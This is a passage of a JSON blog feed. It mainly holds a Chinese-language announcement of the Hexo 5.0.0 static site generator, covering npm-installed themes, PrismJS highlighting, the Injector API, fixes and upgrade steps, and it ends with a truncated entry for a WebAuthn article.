href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]